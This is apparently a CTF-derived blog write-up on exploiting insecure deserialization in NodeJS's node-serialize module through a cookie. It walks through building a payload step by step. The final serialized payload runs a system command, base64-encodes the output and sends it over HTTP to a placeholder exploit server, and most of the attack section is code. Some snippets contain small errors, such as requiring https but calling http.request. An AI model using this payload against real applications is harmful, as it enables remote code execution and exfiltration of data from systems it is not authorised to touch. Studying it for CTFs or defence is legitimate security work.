## NodeJS Insecure Deserialization Out-Of-Band Exfiltration

### Introduction

If you find a vulnerability that allows you to run NodeJS code but you're unable to see the results, then you could use this exploitation technique to exfiltrate the data or the system commands output through an indirect channel (Out of Band). 

This exploitation techniques is one of the many ways you can see the output of executed commands, but I happen to come up with this technique during solving a web challenge in a CTF.

In my case, an Insecure Deserialization vulnerability in NodeJS that allowed me to execute NodeJS code. 

---

### Serialization and Deserialization

Serialization is the process of converting an object into a stream of bytes to store the object or transmit it to memory, a database, or a file. 
Its main purpose is to save the state of an object in order to be able to recreate it when needed.

Deserialization is the reverse process.

### Insecure Deserialization

The vulnerability occurs in the deserialization process when the serialized data is controlled by the user. If a user provides malicious data it will be executed by the back-end technology.

### The Hot Spot

The hot spot in the application was the cookie value. It was a base64 encoded serialized object, after playing with the cookie, removing, adding and changing different values in the object it returned an error showing me that the application is using NodeJS and specifically the node-serialize NodeJS module used in the serialization process.

It was pretty much similar to this blog post: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

The cookies passed to `unserialize()` function which could be exploited to achieve Remote Code Execution.  

### Serialization and Deserialization in NodeJS

An Object in JavaScript is determined by curly braces, like this { property : "value" }

A serialized object in NodeJS will differ depending on the property and the value, so if you serialize the above object it would look like {"property" : "value"}, but if you change the value to a function instead of a string, like { rce : function(){console.log("Hello");} }

And it will look like this:

```javascript
{ "rce" : "_$$ND_FUNC$$_function(){console.log(\\"Hello\\");}" }
```

But in order for the unserialize() function to execute this code, we're going to use the Immediately Invoked Function Expression, which is a JavaScript thing that allows us to call or invoke the function, in our case in the serialized object. All we need to do is to add parentheses () after the body of the function. 

```javascript
{ "rce" : "_$$ND_FUNC$$_function(){console.log(\\"Hello\\");}()" }
```

<img src="https://raw.githubusercontent.com/Th3Mind/assets/main/IIFE.png" />

To serialize objects in nodejs, download node and npm on your machine, install node-serialize module with npm, require the module in your code, then use the required module's serialize(obj) method to serialize an object.

Now that we know we can execute JavaScript code, let's build the OOB exploitation payload.

#### Requirements

- An external http server ( BurpSuite Collaborator for example ) to recieve the data, in our case the output of executed system commands.
- NodeJS modules for building the payload: node:child_process, https, node-serialize


### Hack Steps

1. Execute system commands in NodeJS
2. Base64 encode the executed command's output ( To ensure the NodeJS doesn't return exceptions while sending data that include special characters and spaces to an external website )
3. Send the base64 encoded data as a query string to the external http server.

#### Executing System Commands in NodeJS

```javascript
var { exec } = require('node:child_process')

// run the `ls` command
exec('ls', (err, output) => {
    // Do stuff with output 
    if (err) {
        // log and return if we encounter an error
        console.error("could not execute command: ", err)
        return
    }
    console.log("Output: \n", output)
})
```

#### Base64 Encoding in NodeJS 

Buffers can be used for taking a string or piece of data and doing Base64 encoding of the result. And because Buffers are global objects there's no need for a require.

```javascript
let data = "commandsoutput";
let buff = new Buffer(data);
let base64data = buff.toString('base64');
```

#### Sending HTTP requests in NodeJS 

https://www.geeksforgeeks.org/how-to-make-http-requests-in-node-js/

```javascript
// Importing https module
const https = require('https');
  
// Setting the configuration for
// the request
const options = {
    hostname: '',
    path: '/posts',
    method: 'GET'
};
    
// Sending the request
const req = http.request(options, (res) => {
    let data = ''
     
    res.on('data', (chunk) => {
        data += chunk;
    });
    
    // Ending the response 
    res.on('end', () => {
        console.log('Body:', JSON.parse(data))
    });
       
}).on("error", (err) => {
    console.log("Error: ", err)
}).end()
```
### Payload

So, now we're going to combine all of the above to form our payload with respect to the Hack Steps above.

The final paylaod after serializing will look like this: 

```javascript
{"rce":"_$$ND_FUNC$$_function(){ var { exec } = require('node:child_process'); exec('uname', (err, output) => {let buff = new Buffer(output); let base64data = buff.toString('base64');var https = require('https'); var options = {hostname: 'YOUR_EXTERNAL_EXPLOIT_SERVER.com',path: '/?b64='+base64data, method: 'GET'};var req = http.request(options, (res) => {console.log(\\"done\\")}).end()})}()"}
```

After I base64 encoded the above payload and sent it to the server through the cookie, I got the uname command output in my exploit server!

#### Extra Step

As an extra step, you can send the data to a php script you've written to automatically take the parameter value and decode it from base64.

### Thank you!

Thanks for reading this post, I hope it was a helpful read :)! 

